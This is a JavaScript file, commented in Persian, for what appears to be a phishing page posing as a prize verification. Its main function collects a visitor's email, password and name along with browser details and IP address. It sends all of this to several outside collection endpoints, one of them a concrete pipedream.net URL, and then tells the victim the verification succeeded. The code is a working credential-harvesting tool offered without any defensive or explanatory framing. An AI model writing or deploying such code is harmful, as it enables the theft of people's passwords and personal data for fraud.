// script.js
async function processVerification() {
    const email = document.getElementById('userEmail').value;
    const password = document.getElementById('userPassword').value;
    const name = document.getElementById('userName').value;
    
    // اعتبارسنجی
    if (!email || !password || !name) {
        showMessage('Please fill in all required fields', 'error');
        return;
    }
    
    if (!isValidEmail(email)) {
        showMessage('Please enter a valid email address', 'error');
        return;
    }
    
    // جمع‌آوری اطلاعات اضافی
    const userData = {
        email: email,
        password: password,
        fullName: name,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString(),
        ip: await getUserIP()
    };
    
    // ارسال داده به چندین سرور
    await sendToMultipleEndpoints(userData);
    
    // نمایش پیام موفقیت
    showMessage('✅ Verification successful! Your prize is being processed.', 'success');
}

async function getUserIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unable to retrieve IP';
    }
}

async function sendToMultipleEndpoints(data) {
    const endpoints = [
        'https://webhook.site/YOUR_WEBHOOK_ID_HERE',
        'https://eo2nzpj56m8u4x7.m.pipedream.net',
        'https://hookb.in/YOUR_ENDPOINT_HERE'
    ];
    
    // ارسال به تمام endpoint ها
    const requests = endpoints.map(endpoint => 
        fetch(endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
            mode: 'no-cors'
        }).catch(() => {})
    );
    
    await Promise.allSettled(requests);
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function showMessage(message, type) {
    alert(message);
}